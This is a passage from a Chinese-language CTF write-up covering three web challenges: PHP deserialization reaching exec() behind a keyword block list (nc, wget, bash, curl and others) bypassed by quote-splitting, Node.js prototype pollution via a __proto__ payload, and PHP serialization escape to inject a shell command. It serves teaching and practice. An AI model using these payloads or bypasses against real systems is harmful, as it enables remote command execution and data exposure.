data-106=&amp;#39;11&amp;#39; data-107=&amp;#39;2&amp;#39; data-108=&amp;#39;2&amp;#39; data-109=&amp;#39;2&amp;#39; data-110=&amp;#39;115&amp;#39; data-111=&amp;#39;115&amp;#39; data-112=&amp;#39;15&amp;#39; data-113=&amp;#39;2&amp;#39; data-114=&amp;#39;2&amp;#39; data-115=&amp;#39;2&amp;#39; data-116=&amp;#39;39&amp;#39; data-117=&amp;#39;39&amp;#39; data-118=&amp;#39;39&amp;#39; data-119=&amp;#39;9&amp;#39; data-120=&amp;#39;2&amp;#39; data-121=&amp;#39;2&amp;#39; data-122=&amp;#39;2&amp;#39; data-123=&amp;#39;41&amp;#39; data-124=&amp;#39;41&amp;#39; data-125=&amp;#39;41&amp;#39; data-126=&amp;#39;1&amp;#39; data-127=&amp;#39;2&amp;#39; data-128=&amp;#39;2&amp;#39; data-129=&amp;#39;2&amp;#39; data-130=&amp;#39;46&amp;#39; data-131=&amp;#39;46&amp;#39; data-132=&amp;#39;46&amp;#39; data-133=&amp;#39;6&amp;#39; data-134=&amp;#39;2&amp;#39; data-135=&amp;#39;2&amp;#39; data-136=&amp;#39;2&amp;#39; data-137=&amp;#39;112&amp;#39; data-138=&amp;#39;112&amp;#39; data-139=&amp;#39;12&amp;#39; data-140=&amp;#39;2&amp;#39; data-141=&amp;#39;2&amp;#39; data-142=&amp;#39;2&amp;#39; data-143=&amp;#39;111&amp;#39; data-144=&amp;#39;111&amp;#39; data-145=&amp;#39;11&amp;#39; data-146=&amp;#39;2&amp;#39; data-147=&amp;#39;2&amp;#39; data-148=&amp;#39;2&amp;#39; data-149=&amp;#39;112&amp;#39; data-150=&amp;#39;112&amp;#39; data-151=&amp;#39;12&amp;#39; data-152=&amp;#39;2&amp;#39; data-153=&amp;#39;2&amp;#39; data-154=&amp;#39;2&amp;#39; data-155=&amp;#39;101&amp;#39; data-156=&amp;#39;101&amp;#39; data-157=&amp;#39;1&amp;#39; data-158=&amp;#39;2&amp;#39; data-159=&amp;#39;2&amp;#39; data-160=&amp;#39;2&amp;#39; data-161=&amp;#39;110&amp;#39; data-162=&amp;#39;110&amp;#39; data-163=&amp;#39;10&amp;#39; data-164=&amp;#39;2&amp;#39; data-165=&amp;#39;2&amp;#39; data-166=&amp;#39;2&amp;#39; data-167=&amp;#39;40&amp;#39; data-168=&amp;#39;40&amp;#39; data-169=&amp;#39;40&amp;#39; data-170=&amp;#39;0&amp;#39; data-171=&amp;#39;2&amp;#39; data-172=&amp;#39;2&amp;#39; data-173=&amp;#39;2&amp;#39; data-174=&amp;#39;39&amp;#39; data-175=&amp;#39;39&amp;#39; data-176=&amp;#39;39&amp;#39; data-177=&amp;#39;9&amp;#39; data-178=&amp;#39;2&amp;#39; data-179=&amp;#39;2&amp;#39; data-180=&amp;#39;2&amp;#39; data-181=&amp;#39;99&amp;#39; data-182=&amp;#39;99&amp;#39; data-183=&amp;#39;99&amp;#39; data-184=&amp;#39;9&amp;#39; data-185=&amp;#39;2&amp;#39; data-186=&amp;#39;2&amp;#39; data-187=&amp;#39;2&amp;#39; data-188=&amp;#39;97&amp;#39; data-189=&amp;#39;97&amp;#39; data-190=&amp;#39;97&amp;#39; data-191=&amp;#39;7&amp;#39; data-192=&amp;#39;2&amp;#39; data-193=&amp;#39;2&amp;#39; data-194=&amp;#39;2&amp;#39; data-195=&amp;#39;116&amp;#39; data-196=&amp;#39;116&amp;#39; data-197=&amp;#39;16&amp;#39; data-198=&amp;#39;2&amp;#39; data-199=&amp;#39;2&amp;#39; data-200=&amp;#39;2&amp;#39; data-201=&amp;#39;32&amp;#39; data-202=&amp;#39;32&amp;#39; data-203=&amp;#39;32&amp;#39; data-204=&amp;#39;2&amp;#39; data-205=&amp;#39;2&amp;#39; data-206=&amp;#39;2&amp;#39; data-207=&amp;#39;2&amp;#39; data-208=&amp;#39;47&amp;#39; data-209=&amp;#39;47&amp;#39; data-210=&amp;#39;47&amp;#39; data-211=&amp;#39;7&amp;#39; data-212=&amp;#39;2&amp;#39; data-213=&amp;#39;2&amp;#39; data-214=&amp;#39;2&amp;#39; data-215=&amp;#39;102&amp;#39; data-216=&amp;#39;102&amp;#39; data-217=&amp;#39;2&amp;#39; data-218=&amp;#39;2&amp;#39; data-219=&amp;#39;2&amp;#39; data-220=&amp;#39;2&amp;#39; data-221=&amp;#39;108&amp;#39; data-222=&amp;#39;108&amp;#39; data-223=&amp;#39;8&amp;#39; data-224=&amp;#39;2&amp;#39; data-225=&amp;#39;2&amp;#39; data-226=&amp;#39;2&amp;#39; data-227=&amp;#39;97&amp;#39; data-228=&amp;#39;97&amp;#39; data-229=&amp;#39;97&amp;#39; data-230=&amp;#39;7&amp;#39; data-231=&amp;#39;2&amp;#39; data-232=&amp;#39;2&amp;#39; data-233=&amp;#39;2&amp;#39; data-234=&amp;#39;103&amp;#39; data-235=&amp;#39;103&amp;#39; data-236=&amp;#39;3&amp;#39; data-237=&amp;#39;2&amp;#39; data-238=&amp;#39;2&amp;#39; data-239=&amp;#39;2&amp;#39; data-240=&amp;#39;39&amp;#39; data-241=&amp;#39;39&amp;#39; data-242=&amp;#39;39&amp;#39; data-243=&amp;#39;9&amp;#39; data-244=&amp;#39;2&amp;#39; data-245=&amp;#39;2&amp;#39; data-246=&amp;#39;2&amp;#39; data-247=&amp;#39;41&amp;#39; data-248=&amp;#39;41&amp;#39; data-249=&amp;#39;41&amp;#39; data-250=&amp;#39;1&amp;#39; data-251=&amp;#39;2&amp;#39; data-252=&amp;#39;2&amp;#39; data-253=&amp;#39;2&amp;#39; data-254=&amp;#39;46&amp;#39; data-255=&amp;#39;46&amp;#39; data-256=&amp;#39;46&amp;#39; data-257=&amp;#39;6&amp;#39; data-258=&amp;#39;2&amp;#39; data-259=&amp;#39;2&amp;#39; data-260=&amp;#39;2&amp;#39; data-261=&amp;#39;114&amp;#39; data-262=&amp;#39;114&amp;#39; data-263=&amp;#39;14&amp;#39; data-264=&amp;#39;2&amp;#39; data-265=&amp;#39;2&amp;#39; data-266=&amp;#39;2&amp;#39; data-267=&amp;#39;101&amp;#39; data-268=&amp;#39;101&amp;#39; data-269=&amp;#39;1&amp;#39; data-270=&amp;#39;2&amp;#39; data-271=&amp;#39;2&amp;#39; data-272=&amp;#39;2&amp;#39; data-273=&amp;#39;97&amp;#39; data-274=&amp;#39;97&amp;#39; data-275=&amp;#39;97&amp;#39; data-276=&amp;#39;7&amp;#39; data-277=&amp;#39;2&amp;#39; data-278=&amp;#39;2&amp;#39; data-279=&amp;#39;2&amp;#39; data-280=&amp;#39;100&amp;#39; data-281=&amp;#39;100&amp;#39; data-282=&amp;#39;0&amp;#39; data-283=&amp;#39;2&amp;#39; data-284=&amp;#39;2&amp;#39; data-285=&amp;#39;2&amp;#39; data-286=&amp;#39;40&amp;#39; data-287=&amp;#39;40&amp;#39; data-288=&amp;#39;40&amp;#39; data-289=&amp;#39;0&amp;#39; data-290=&amp;#39;2&amp;#39; data-291=&amp;#39;2&amp;#39; data-292=&amp;#39;2&amp;#39; data-293=&amp;#39;41&amp;#39; data-294=&amp;#39;41&amp;#39; data-295=&amp;#39;41&amp;#39; data-296=&amp;#39;1&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到 flag。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-3-r-c-e&quot;&gt;[Week 3]R!!!C!!!E!!!&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-3-r-c-e&quot; aria-label=&quot;Anchor link for: week-3-r-c-e&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;源代码如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class minipop{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $code;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $qwejaskdjnlka;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __toString()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(!preg_match(&amp;#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\{|\}|\&amp;gt;|\&amp;lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&amp;#39;, $this-&amp;gt;code)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            exec($this-&amp;gt;code);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return &amp;quot;alright&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        echo $this-&amp;gt;qwejaskdjnlka;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if(isset($_POST[&amp;#39;payload&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &#x2F;&#x2F;wanna try?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    unserialize($_POST[&amp;#39;payload&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过 exec 方法可以执行系统命令，因此这题也考的是 Linux 的命令绕过。&lt;&#x2F;p&gt;
&lt;p&gt;由于引号没有进行绕过，所以可以通过引号进行关键字的绕过，构造 Payload 过程如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class minipop{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $code;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $qwejaskdjnlka;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __toString()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(!preg_match(&amp;#39;&#x2F;\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\{|\}|\&amp;gt;|\&amp;lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&amp;#39;, $this-&amp;gt;code)){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            exec($this-&amp;gt;code);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return &amp;quot;alright&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        echo $this-&amp;gt;qwejaskdjnlka;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if(isset($_POST[&amp;#39;payload&amp;#39;])){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &#x2F;&#x2F;wanna try?
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    unserialize($_POST[&amp;#39;payload&amp;#39;]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$pop = new minipop();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$pop-&amp;gt;qwejaskdjnlka = new minipop();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$pop-&amp;gt;qwejaskdjnlka-&amp;gt;code = &amp;quot;cat &#x2F;flag_is_h3eeere | t&amp;#39;&amp;#39;ee 2&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo serialize($pop);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; O:7:&amp;quot;minipop&amp;quot;:2:{s:4:&amp;quot;code&amp;quot;;N;s:13:&amp;quot;qwejaskdjnlka&amp;quot;;O:7:&amp;quot;minipop&amp;quot;:2:{s:4:&amp;quot;code&amp;quot;;s:30:&amp;quot;cat &#x2F;flag_is_h3eeere | t&amp;#39;&amp;#39;ee 2&amp;quot;;s:13:&amp;quot;qwejaskdjnlka&amp;quot;;N;}}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;即可得到 flag。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-3-otenkigirl&quot;&gt;[Week 3]OtenkiGirl&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-3-otenkigirl&quot; aria-label=&quot;Anchor link for: week-3-otenkigirl&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;源代码中存在 &lt;code&gt;hint.txt&lt;&#x2F;code&gt; 内容如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;---
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;“请只看‘routes’文件夹。没有SQL注入。”御坂御坂满怀期待地说。
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在 &lt;code&gt;routes&#x2F;info.js&lt;&#x2F;code&gt; 可以发现该路由用于根据所给的 timestamp 输出该时间戳之后的所有内容。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;async function getInfo(timestamp) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    timestamp = typeof timestamp === &amp;quot;number&amp;quot; ? timestamp : Date.now();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &#x2F;&#x2F; Remove test data from before the movie was released
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    timestamp = Math.max(timestamp, minTimestamp);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &amp;gt;= ?`, [timestamp]).catch(e =&amp;gt; { throw e });
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return data;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在输入 timestamp 后，上述方法会将所输入的 timestamp 与 min_public_time 进行对比，其中 &lt;code&gt;CONFIG.min_public_time&lt;&#x2F;code&gt; 值不存在，&lt;code&gt;DEFAULT_CONFIG.min_public_time&lt;&#x2F;code&gt; 值为 &lt;code&gt;2019-07-09&lt;&#x2F;code&gt; ，因此需要通过污染 &lt;code&gt;min_public_time&lt;&#x2F;code&gt; 属性才能使其输出 2019-07-09 之前的数据。&lt;&#x2F;p&gt;
&lt;p&gt;minTimestamp 首先会从 &lt;code&gt;CONFIG&lt;&#x2F;code&gt; 中获取 &lt;code&gt;min_public_time&lt;&#x2F;code&gt; ，获取失败后继续再从 &lt;code&gt;DEFAULT_CONFIG&lt;&#x2F;code&gt; 中获取，二者的原型对象都是 &lt;code&gt;Object&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;p&gt;在 &lt;code&gt;routes&#x2F;submit.js&lt;&#x2F;code&gt; 中可以发现原型链污染点：&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; L39
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;const merge = (dst, src) =&amp;gt; {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if (typeof dst !== &amp;quot;object&amp;quot; || typeof src !== &amp;quot;object&amp;quot;) return dst;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for (let key in src) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if (key in dst &amp;amp;&amp;amp; key in src) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            dst[key] = merge(dst[key], src[key]);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        } else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            dst[key] = src[key];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return dst;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; L73
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;const DEFAULT = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    date: &amp;quot;unknown&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    place: &amp;quot;unknown&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;const result = await insert2db(merge(DEFAULT, data));
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在上述代码中，&lt;code&gt;data&lt;&#x2F;code&gt; 的值是可控的，能够通过 POST 请求传入。&lt;code&gt;DEFAULT&lt;&#x2F;code&gt; 的原型对象也是 &lt;code&gt;Object&lt;&#x2F;code&gt; ，因此可以通过 submit 路由来进行污染攻击。&lt;&#x2F;p&gt;
&lt;p&gt;构造 Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;contact&amp;quot;:&amp;quot;a&amp;#39;s&amp;#39;d&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;reason&amp;quot;:&amp;quot;a&amp;#39;d&amp;#39;s&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    &amp;quot;__proto__&amp;quot;: {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        &amp;quot;min_public_time&amp;quot;:  &amp;quot;1970-01-01&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过访问 &lt;code&gt;&#x2F;info&#x2F;0&lt;&#x2F;code&gt; 可以得到回显得到 flag 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    status: &amp;quot;success&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    data: [
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ...,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            wishid: &amp;quot;2TrumXdm9HTH9SZvgNPaHmAx&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            date: &amp;quot;2021-09-27&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            place: &amp;quot;学園都市&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            contact: &amp;quot;御坂美琴&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            reason: &amp;quot;海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{c2c65ecd-d8d1-4b68-8003-5e608c0dc222}です&amp;quot;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            timestamp: 1190726040836
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        },
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ...
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-4-tao&quot;&gt;[Week 4]逃&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-4-tao&quot; aria-label=&quot;Anchor link for: week-4-tao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;这题考察的是 PHP 反序列化逃逸。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;function waf($str){
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return str_replace(&amp;quot;bad&amp;quot;,&amp;quot;good&amp;quot;,$str);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class GetFlag {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $key;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $cmd = &amp;quot;whoami&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __construct($key)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $this-&amp;gt;key = $key;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public function __destruct()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        system($this-&amp;gt;cmd);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;unserialize(waf(serialize(new GetFlag($_GET[&amp;#39;key&amp;#39;]))));
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可控的属性为 &lt;code&gt;key&lt;&#x2F;code&gt; ，并且可以通过 waf 中的替换来实现反序列化逃逸的效果。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$getFlag = new GetFlag(&amp;#39;&amp;#39;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo &amp;#39;&amp;lt;br&amp;gt;&amp;#39;.serialize($getFlag).&amp;#39;&amp;lt;br&amp;gt;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo waf(serialize($getFlag)).&amp;#39;&amp;lt;br&amp;gt;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; O:7:&amp;quot;GetFlag&amp;quot;:2:{s:3:&amp;quot;key&amp;quot;;s:0:&amp;quot;&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:6:&amp;quot;whoami&amp;quot;;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; O:7:&amp;quot;GetFlag&amp;quot;:2:{s:3:&amp;quot;key&amp;quot;;s:0:&amp;quot;&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:6:&amp;quot;whoami&amp;quot;;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;需要通过逃逸构造出 &lt;code&gt;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls &#x2F;&quot;;}&lt;&#x2F;code&gt; 共 24 个字符，又因为 bad 替换成 good 后即增加一位，因此需要循环 24 次 bad 来进行逃逸。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$getFlag = new GetFlag(str_repeat(&amp;quot;bad&amp;quot;, 24).&amp;#39;&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:4:&amp;quot;ls &#x2F;&amp;quot;;}&amp;#39;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo &amp;#39;&amp;lt;br&amp;gt;&amp;#39;.serialize($getFlag).&amp;#39;&amp;lt;br&amp;gt;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;echo waf(serialize($getFlag)).&amp;#39;&amp;lt;br&amp;gt;&amp;#39;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; O:7:&amp;quot;GetFlag&amp;quot;:2:{s:3:&amp;quot;key&amp;quot;;s:96:&amp;quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:4:&amp;quot;ls &#x2F;&amp;quot;;}&amp;quot;;s:3:&amp;quot;cmd&amp;quot;;s:6:&amp;quot;whoami&amp;quot;;}
